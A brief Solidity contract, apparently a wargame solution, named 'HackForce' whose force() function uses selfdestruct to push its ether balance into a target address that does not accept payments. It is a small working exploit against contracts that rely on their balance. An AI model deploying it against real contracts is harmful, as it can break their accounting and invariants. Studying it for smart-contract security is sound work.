// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackForce {
    constructor () payable {}

    function force(address payable _forceAddr) public{
        selfdestruct(_forceAddr);
    }
}
